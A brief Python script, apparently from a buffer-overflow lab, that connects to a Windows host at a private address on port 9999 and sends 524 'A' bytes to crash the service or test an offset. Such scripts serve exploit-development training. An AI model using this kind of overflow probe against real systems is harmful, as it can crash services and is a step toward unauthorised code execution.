import sys
import socket

host = "10.0.2.30" #IP Máquina Windows
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((host, port))
    s.recv(1024)
    junk = b"A"*524
    s.sendall(junk)
    print("Sent")

except Exception as e:
    print("Unable to connect " + str(host) + str(e))
    sys.exit(0)